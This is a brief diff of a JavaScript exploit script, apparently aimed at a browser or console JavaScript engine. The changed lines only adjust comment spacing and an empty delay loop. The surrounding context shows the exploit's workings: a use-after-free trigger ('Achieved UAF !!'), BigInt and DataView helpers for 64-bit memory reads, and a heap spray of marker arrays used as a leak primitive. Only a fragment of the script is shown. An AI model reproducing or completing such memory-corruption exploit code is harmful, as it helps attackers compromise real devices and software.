@@ -426,8 +426,8 @@ BigInt.TYPE_MAP = {
   Float64Array: 'f64',
 }
 
-//include('globals.js')
-//include('util.js')
+// include('globals.js')
+// include('util.js')
 
 DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
   littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian
@@ -721,7 +721,7 @@ make_uaf(uaf_arr)
 log('Achieved UAF !!')
 
 // Small delay before spray
-for (var d = 0; d < 1000; d++) {}
+for (var d = 0; d < 1000; d++);
 
 log('Spraying arrays with marker...')
 // spray candidates arrays to be used as leak primitive (increased from 0x800)
